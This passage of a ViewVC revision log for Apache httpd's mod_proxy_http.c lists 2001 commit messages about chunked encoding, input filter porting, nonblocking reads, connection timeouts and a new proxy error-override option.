Submitted by:	Zvi Har'El <rl@math.technion.ac.il>

```

---

Revision [**91463**](/viewvc?view=revision&revision=91463) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91463&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91463&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91463))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91463)

Modified
*Sun Oct 14 20:41:00 2001 UTC*
(23 years, 3 months ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91463)

File length: 39749 byte(s)

Diff to [previous 91440](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91440&r2=91463)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91440&r2=91463&diff_format=h))
```
Fix the first bucket not getting chunked properly.  The reason was that
we left the TE header in the output headers, so ap_set_keepalive didn't
set r->chunked to 1.  So, ap_http_header_filter wouldn't insert CHUNK
filter appropriately.  I have no clue how it chunked anything at all
before this patch, but hey, it looks right now.

Tested with Yahoo, Apple, apache.org, and /.
/. is interesting in that it sends both Conn: Close and TE: chunked.

```

---

Revision [**91440**](/viewvc?view=revision&revision=91440) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91440&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91440&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91440))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91440)

Modified
*Fri Oct 12 02:00:41 2001 UTC*
(23 years, 3 months ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91440)

File length: 39542 byte(s)

Diff to [previous 91436](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91436&r2=91440)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91436&r2=91440&diff_format=h))
```
Lose the magic number and use the central #define AP_IOBUFSIZE.

Hey, I've never seen it in actual use anywhere, so I didn't know.

Thanks to Roy for pointing it out.

```

---

Revision [**91436**](/viewvc?view=revision&revision=91436) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91436&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91436&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91436))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91436)

Modified
*Thu Oct 11 20:03:26 2001 UTC*
(23 years, 3 months ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91436)

File length: 39526 byte(s)

Diff to [previous 91370](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91370&r2=91436)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91370&r2=91436&diff_format=h))
```
Teach mod_proxy to live with the new filtering scheme.

Tested with www.yahoo.com (Conn: Close), www.apache.org (CL), and
www.apple.com (TE: Chunked).

```

---

Revision [**91370**](/viewvc?view=revision&revision=91370) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91370&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91370&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91370))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91370)

Modified
*Mon Oct 8 21:49:17 2001 UTC*
(23 years, 3 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91370)

File length: 39290 byte(s)

Diff to [previous 91363](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91363&r2=91370)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91363&r2=91370&diff_format=h))
```
dechunking filter removed.
add HTTP_IN filter after the headers have been parsed.
so that the HTTP_IN can check them ;-)
Still not 100% if this works properly, but I don't get
the chunking numbers displayed on my browser,
so it's better than what was there.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**91363**](/viewvc?view=revision&revision=91363) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91363&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91363&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91363))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91363)

Modified
*Mon Oct 8 19:25:35 2001 UTC*
(23 years, 3 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91363)

File length: 39837 byte(s)

Diff to [previous 91171](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91171&r2=91363)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91171&r2=91363&diff_format=h))
```
initial port of new Request-mode HTTP_IN filter to proxy.
Status: It serves a reverse-proxy page.. but SLOWLY.
VERY SLOWLY.
still looking at why, but now it serves pages instead of dumping core.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**91171**](/viewvc?view=revision&revision=91171) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91171&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91171&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91171))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91171)

Modified
*Fri Sep 28 10:23:32 2001 UTC*
(23 years, 4 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91171)

File length: 39843 byte(s)

Diff to [previous 91160](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91160&r2=91171)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91160&r2=91171&diff_format=h))
```
Some style cleanups related to the ProxyErrorOverride function.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**91160**](/viewvc?view=revision&revision=91160) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91160&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91160&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91160))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91160)

Modified
*Thu Sep 27 04:01:10 2001 UTC*
(23 years, 4 months ago)
by *jwoolley*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91160)

File length: 39851 byte(s)

Diff to [previous 91155](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91155&r2=91160)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91155&r2=91160&diff_format=h))
```
Immortal data should go in an immortal bucket, not a pool bucket.  It would
still work in a pool bucket, but only by coincidence.  At the very least, a
pool bucket is way more overhead than this poor unsuspecting little CRLF
needs to get by.

```

---

Revision [**91155**](/viewvc?view=revision&revision=91155) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91155&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91155&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91155))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91155)

Modified
*Wed Sep 26 19:58:10 2001 UTC*
(23 years, 4 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91155)

File length: 39848 byte(s)

Diff to [previous 91094](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91094&r2=91155)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91094&r2=91155&diff_format=h))
```
change command name so that it starts with 'Proxy'
fix the command so that it returns 'OK' instead of 'HTTP_OK'

PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**91094**](/viewvc?view=revision&revision=91094) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91094&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91094&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91094))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91094)

Modified
*Thu Sep 20 14:23:06 2001 UTC*
(23 years, 4 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91094)

File length: 39686 byte(s)

Diff to [previous 91092](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91092&r2=91094)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91092&r2=91094&diff_format=h))
```
Clean up a compile warning on AIX.

```

---

Revision [**91092**](/viewvc?view=revision&revision=91092) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91092&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91092&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91092))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91092)

Modified
*Thu Sep 20 05:34:50 2001 UTC*
(23 years, 4 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91092)

File length: 39679 byte(s)

Diff to [previous 90820](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90820&r2=91092)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90820&r2=91092&diff_format=h))
```
Added New Option 'HTTPProxyOverrideReturnedErrors' which lets the server override
the error pages returned from the proxied server and replace them with the standard
server error handling on the main server.

Reviewed by:	Graham, Chuck

```

---

Revision [**90820**](/viewvc?view=revision&revision=90820) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90820&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90820&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90820))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90820)

Modified
*Thu Aug 30 19:48:02 2001 UTC*
(23 years, 5 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90820)

File length: 39092 byte(s)

Diff to [previous 90402](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90402&r2=90820)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90402&r2=90820&diff_format=h))
```

  Undo another int type'ed port (and format a little structure for legibility).

```

---

Revision [**90402**](/viewvc?view=revision&revision=90402) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90402&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90402&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90402))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90402)

Modified
*Mon Aug 20 16:49:29 2001 UTC*
(23 years, 5 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90402)

File length: 39062 byte(s)

Diff to [previous 90367](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90367&r2=90402)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90367&r2=90402&diff_format=h))
```
adjust to apr_uri_ rename
Submitted by:	dougm@apache.org
Reviewed by:	ianh@apache.org

```

---

Revision [**90367**](/viewvc?view=revision&revision=90367) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90367&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90367&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90367))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90367)

Modified
*Sun Aug 19 20:21:07 2001 UTC*
(23 years, 5 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90367)

File length: 39100 byte(s)

Diff to [previous 90290](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90290&r2=90367)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90290&r2=90367&diff_format=h))
```
MSVC can't seem to handle
        int buffer_len = 1;
        char test_buffer[buffer_len];

```

---

Revision [**90290**](/viewvc?view=revision&revision=90290) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90290&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90290&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90290))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90290)

Modified
*Fri Aug 17 17:12:18 2001 UTC*
(23 years, 5 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90290)

File length: 39108 byte(s)

Diff to [previous 90264](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90264&r2=90290)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90264&r2=90290&diff_format=h))
```
initialize some values on variable creation
Submitted by:	John Barbee <barbee@veribox.net>

```

---

Revision [**90264**](/viewvc?view=revision&revision=90264) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90264&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90264&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90264))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90264)

Modified
*Fri Aug 17 01:38:16 2001 UTC*
(23 years, 5 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90264)

File length: 39107 byte(s)

Diff to [previous 90171](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90171&r2=90264)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90171&r2=90264&diff_format=h))
```
Fix behavior in the event that a socket is closed.
Submitted by: barbee@veribox.net
Reviewed by: orlikowski@apache.org

```

---

Revision [**90171**](/viewvc?view=revision&revision=90171) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90171&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90171&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90171))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90171)

Modified
*Wed Aug 15 18:36:05 2001 UTC*
(23 years, 5 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90171)

File length: 38483 byte(s)

Diff to [previous 90159](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90159&r2=90171)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90159&r2=90171&diff_format=h))
```
Fix a char * vs char ** mixup...
Submitted by: barbee@veribox.net

```

---

Revision [**90159**](/viewvc?view=revision&revision=90159) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90159&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90159&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90159))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90159)

Modified
*Tue Aug 14 18:04:58 2001 UTC*
(23 years, 5 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90159)

File length: 38474 byte(s)

Diff to [previous 90127](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90127&r2=90159)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90127&r2=90159&diff_format=h))
```
Break http_proxy_handler into multiple smaller functions.
Submitted by:	John Barbee <barbee@veribox.net>

```

---

Revision [**90127**](/viewvc?view=revision&revision=90127) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90127&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90127&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90127))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90127)

Modified
*Sun Aug 12 21:24:35 2001 UTC*
(23 years, 5 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90127)

File length: 31727 byte(s)

Diff to [previous 90092](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90092&r2=90127)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90092&r2=90127&diff_format=h))
```
Make the body read in proxy http handler nonblocking. There's no sense
in serializing 4-8 client connections into a single origin server
connection, as is the blocking behavior.

Added instrumentation that we don't want compiled in normally to assist in
debugging chunking problems. apr_get_brigade is apparently blocking during
chunked body fetch, or proxy_http_handler is getting deadlocked with
the dechunk filter. Show PID for prefork debugging. We'll figure out
getting TIDs later.

```

---

Revision [**90092**](/viewvc?view=revision&revision=90092) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90092&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90092&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90092))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90092)

Modified
*Sat Aug 11 05:10:23 2001 UTC*
(23 years, 5 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90092)

File length: 31551 byte(s)

Diff to [previous 90012](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90012&r2=90092)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=90012&r2=90092&diff_format=h))
```
Fix the proxy when the origin server sends back a 100
Continue response.  [John Barbee <barbee@veribox.net>]

```

---

Revision [**90012**](/viewvc?view=revision&revision=90012) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90012&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=90012&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=90012))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=90012)

Modified
*Tue Aug 7 21:46:47 2001 UTC*
(23 years, 5 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=90012)

File length: 29406 byte(s)

Diff to [previous 89908](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89908&r2=90012)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89908&r2=90012&diff_format=h))
```
change readbytes from a apr_size_t to a apr_off_t to match the parameter
required in ap_get_brigade
Submitted by:	 barbee@veribox.net
Reviewed by:	 ianh@apache.org

```

---

Revision [**89908**](/viewvc?view=revision&revision=89908) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89908&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89908&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89908))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89908)

Modified
*Fri Aug 3 18:00:38 2001 UTC*
(23 years, 5 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89908)

File length: 29407 byte(s)

Diff to [previous 89907](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89907&r2=89908)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89907&r2=89908&diff_format=h))
```
Add a timeout when making connections from within the proxy.
Now, if someone wants to add a special scoreboard state for proxy
attempting to make connection, be my guest.

```

---

Revision [**89907**](/viewvc?view=revision&revision=89907) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89907&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89907&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89907))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89907)

Modified
*Fri Aug 3 16:25:10 2001 UTC*
(23 years, 5 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89907)

File length: 29270 byte(s)

Diff to [previous 89837](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89837&r2=89907)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89837&r2=89907&diff_format=h))
```
Both the ftp and http proxies were erroneously sending a flush bucket after
an eos bucket. This had been put in place to repair a bug, but was covering
the symptoms, rather than providing the cure. Bug repaired, and kludge
removed.

Submitted by: barbee@veribox.net

```

---

Revision [**89837**](/viewvc?view=revision&revision=89837) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89837&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89837&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89837))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89837)

Modified
*Tue Jul 31 19:12:56 2001 UTC*
(23 years, 6 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89837)

File length: 29337 byte(s)

Diff to [previous 89607](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89607&r2=89837)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89607&r2=89837&diff_format=h))
```
Being slightly picky: properly namespace protect make_fake_req()

```

---

Revision [**89607**](/viewvc?view=revision&revision=89607) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89607&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89607&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89607))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89607)

Modified
*Wed Jul 18 20:35:13 2001 UTC*
(23 years, 6 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89607)

File length: 29328 byte(s)

Diff to [previous 89569](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89569&r2=89607)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89569&r2=89607&diff_format=h))
```
Remove APR_NO_INHERIT as it is now private.
sigh... the cost of being bleeding edge
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**89569**](/viewvc?view=revision&revision=89569) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89569&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89569&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89569))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89569)

Modified
*Tue Jul 17 21:43:35 2001 UTC*
(23 years, 6 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89569)

File length: 29344 byte(s)

Diff to [previous 89559](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89559&r2=89569)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89559&r2=89569&diff_format=h))
```
Change the APR_INHERIT flag to APR_NO_INHERIT,which is the default (as recommended by rbb)

PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**89559**](/viewvc?view=revision&revision=89559) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89559&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89559&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89559))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89559)

Modified
*Mon Jul 16 17:54:38 2001 UTC*
(23 years, 6 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89559)

File length: 29341 byte(s)

Diff to [previous 89551](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89551&r2=89559)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89551&r2=89559&diff_format=h))
```
applies change in APR function apr_socket_create, which added a new parameter.
I defaulted these to APR_INHERIT.
Also..
the connection-close was being merged, insted of 'set'
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**89551**](/viewvc?view=revision&revision=89551) -
